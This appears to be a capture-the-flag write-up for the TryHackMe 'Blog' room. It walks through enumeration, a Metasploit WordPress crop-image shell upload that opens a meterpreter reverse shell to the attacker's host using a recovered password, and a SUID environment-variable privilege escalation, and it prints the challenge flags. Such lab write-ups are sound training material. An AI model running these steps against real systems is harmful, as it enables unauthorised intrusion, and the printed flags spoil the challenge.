


![](https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/blog/assets/cover.png)
<img src='https://github.com/A3lpha/Write-Ups/blob/main/TryHackMe/blog/assets/banner.png' style='zoom: 80%;' align=left /> <font size='10'><blog></font>

1<sup>st</sup> August 2023

Prepared By: `<https://tryhackme.com/p/Al3pha>`

Challenge Author(s): `<(https://tryhackme.com/p/Nameless0ne)>`

Difficulty: <font color='orange'>Medium</font>

<br><br>

***NOTE : The headings with `(!)` should be necessarily included in your writeup while the ones with `(*)` are optional and should be included only if there is a need to. Of course, you can modify the content of each section accordingly. We just provide some boilerplate text.***

~~~
┌──(alpha㉿sploit)-[~/blog]
└─$ ping blog.thm    
PING blog.thm (10.10.115.215) 56(84) bytes of data.
64 bytes from blog.thm (10.10.115.215): icmp_seq=1 ttl=63 time=593 ms
64 bytes from blog.thm (10.10.115.215): icmp_seq=2 ttl=63 time=484 ms
^Z
zsh: suspended  ping blog.thm
~~~
# ports that can open
~~~
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
~~~
# nmap              
~~~
# Nmap 7.94 scan initiated Tue Oct  3 11:30:38 2023 as: nmap -sV -A -sC -oN nmap 10.10.115.215
Nmap scan report for blog.thm (10.10.115.215)
Host is up (0.29s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.0
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=10/3%OT=22%CT=1%CU=35018%PV=Y%DS=2%DC=T%G=Y%TM=651C340
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=9)SEQ(SP=106%GCD=1%ISR=109%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=B)SEQ(SP=106%G
OS:CD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=B)OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M5
OS:08NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3
OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-10-03T15:32:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2023-10-03T15:32:19+00:00
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   183.51 ms 10.8.0.1
2   183.90 ms blog.thm (10.10.115.215)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  3 11:32:26 2023 -- 1 IP address (1 host up) scanned in 108.80 seconds

~~~
# smbshares
A samba share is available and hosts 3 files, but none seems interesting.
~~~
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ ls
Ar7ph3IA  nRnClkTI  users.txt
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ smbclient -L //10.10.115.215
Password for [WORKGROUP\alpha]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BLOG
                                                                                                                                           
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ smbclient -L //10.10.115.215/BillySMB
Password for [WORKGROUP\alpha]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BLOG
                                                                                                                                           
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ smbclient //10.10.115.215/BillySMB  
Password for [WORKGROUP\alpha]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9790372 blocks available
smb: \> get Alice-White-Rabbit.jpg
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (33.6 KiloBytes/sec) (average 33.6 KiloBytes/sec)
smb: \> get tswift.mp4
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (313.1 KiloBytes/sec) (average 256.9 KiloBytes/sec)
smb: \> get check-this.png
getting file \check-this.png of size 3082 as check-this.png (4.9 KiloBytes/sec) (average 228.2 KiloBytes/sec)
smb: \> exit
~~~           
~~~            
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ ls      
Alice-White-Rabbit.jpg  Ar7ph3IA  check-this.png  nRnClkTI  tswift.mp4  users.txt         
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ steghide extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".              
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ ls
Alice-White-Rabbit.jpg  Ar7ph3IA  check-this.png  nRnClkTI  rabbit_hole.txt  tswift.mp4  users.txt
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend. 
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ zbarimg -q --raw check-this.png
https://qrgo.page.link/M6dE     
┌──(alpha㉿sploit)-[~/ctf/blog]
~~~

# Wordpress

We can use wpscan to identify the version and enumerate valid users:
~~~
┌──(alpha㉿sploit)-[~]
└─$ wpscan --url http://blog.thm --enumerate u               
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://blog.thm/ [10.10.115.215]
[+] Started: Tue Oct  3 11:52:07 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <========================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Oct  3 11:52:21 2023
[+] Requests Done: 70
[+] Cached Requests: 8
[+] Data Sent: 16.336 KB
[+] Data Received: 20.576 MB
[+] Memory used: 198.848 MB
[+] Elapsed time: 00:00:14
~~~


~~~
──(alpha㉿sploit)-[~/ctf/blog]
└─$ searchsploit wordpress 5.0.0
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                                             | php/webapps/51042.txt
WordPress 5.0.0 - Image Remote Code Execution                                                                                       | php/webapps/49512.py
WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                                                                         | php/remote/46662.rb
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                             | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                             | php/dos/47800.py
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                                         | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                 | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                           | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                         | php/webapps/48918.sh
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
~~~
~~~        
┌──(alpha㉿sploit)-[~/ctf/blog]
└─$ msfconsole -q               
msf6 > search wordpress 5.0.0

Matching Modules
================

   #  Name                            Disclosure Date  Rank       Check  Description
   -  ----                            ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce  2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_crop_rce

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > show options

Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.3      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/wp_crop_rce) > set LHOST 10.8.5.88
LHOST => 10.8.5.88
msf6 exploit(multi/http/wp_crop_rce) > set RHOSTS blog.thm
RHOSTS => blog.thm
msf6 exploit(multi/http/wp_crop_rce) > set USERNAME kwheel
USERNAME => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set PASSWORD cutiepie1
PASSWORD => cutiepie1
msf6 exploit(multi/http/wp_crop_rce) > exploit

[*] Started reverse TCP handler on 10.8.5.88:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.115.215
[*] Meterpreter session 1 opened (10.8.5.88:4444 -> 10.10.115.215:44706) at 2023-10-03 12:11:51 -0400
[*] Attempting to clean up files...

meterpreter > ls
Listing: /var/www/wordpress
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100640/rw-r-----  235    fil   2020-05-28 08:15:42 -0400  .htaccess
100640/rw-r-----  235    fil   2020-05-27 23:44:26 -0400  .htaccess_backup
100644/rw-r--r--  1110   fil   2023-10-03 12:11:32 -0400  BbtlnQoyxf.php
100644/rw-r--r--  1112   fil   2023-10-03 12:04:37 -0400  LYklheVmQB.php
100640/rw-r-----  418    fil   2013-09-24 20:18:11 -0400  index.php
100640/rw-r-----  19935  fil   2020-05-26 11:39:37 -0400  license.txt
100640/rw-r-----  7415   fil   2020-05-26 11:39:37 -0400  readme.html
100640/rw-r-----  5458   fil   2020-05-26 11:39:37 -0400  wp-activate.php
040750/rwxr-x---  4096   dir   2018-12-06 13:00:07 -0500  wp-admin
100640/rw-r-----  364    fil   2015-12-19 06:20:28 -0500  wp-blog-header.php
100640/rw-r-----  1889   fil   2018-05-02 18:11:25 -0400  wp-comments-post.php
100640/rw-r-----  2853   fil   2015-12-16 04:58:26 -0500  wp-config-sample.php
100640/rw-r-----  3279   fil   2020-05-27 23:49:17 -0400  wp-config.php
040750/rwxr-x---  4096   dir   2020-05-25 23:52:32 -0400  wp-content
100640/rw-r-----  3669   fil   2017-08-20 00:37:45 -0400  wp-cron.php
040750/rwxr-x---  12288  dir   2018-12-06 13:00:08 -0500  wp-includes
100640/rw-r-----  2422   fil   2016-11-20 21:46:30 -0500  wp-links-opml.php
100640/rw-r-----  3306   fil   2017-08-22 07:52:48 -0400  wp-load.php
100640/rw-r-----  37286  fil   2020-05-26 11:39:37 -0400  wp-login.php
100640/rw-r-----  8048   fil   2017-01-11 00:13:43 -0500  wp-mail.php
100640/rw-r-----  17421  fil   2018-10-23 03:04:39 -0400  wp-settings.php
100640/rw-r-----  30091  fil   2018-04-29 19:10:26 -0400  wp-signup.php
100640/rw-r-----  4620   fil   2017-10-23 18:12:51 -0400  wp-trackback.php
100640/rw-r-----  3065   fil   2016-08-31 12:31:29 -0400  xmlrpc.php

meterpreter > shell 
Process 1693 created.
Channel 1 created.
SHELL=/bin/bash script -q /dev/null
www-data@blog:/var/www/wordpress$ cd 
cd
bash: cd: HOME not set
www-data@blog:/var/www/wordpress$ cd /home
cd /home
www-data@blog:/home$ cd
cd
bash: cd: HOME not set
www-data@blog:/home$ cd /
cd /
www-data@blog:/$ ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
www-data@blog:/$ find / -type f -user root -perm -u=s 2>/dev/null
find / -type f -user root -perm -u=s 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
~~~
Running it outputs that we are “Not an admin”:

~~~
www-data@blog:/$ /usr/sbin/checker
/usr/sbin/checker
Not an Admin
~~~
The executable is a 64bit ELF:
~~~
www-data@blog:/$ file /usr/sbin/checker
file /usr/sbin/checker
/usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped
www-data@blog:/$ ltrace /usr/sbin/checker
ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
www-data@blog:/$ export admin=1
export admin=1
www-data@blog:/$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/# ls
ls
bin    dev   initrd.img      lib64       mnt   root  snap      sys  var
boot   etc   initrd.img.old  lost+found  opt   run   srv       tmp  vmlinuz
cdrom  home  lib             media       proc  sbin  swap.img  usr  vmlinuz.old
root@blog:/# cd /root
cd /root
root@blog:/root# ls
ls
root.txt
root@blog:/root# cat root.txt
cat root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
~~~
~~~
root@blog:/root# find / -type f -name user.txt 2>/dev/null
find / -type f -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
root@blog:/root# cat /media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
root@blog:/root# 
~~~
                                                                                                        
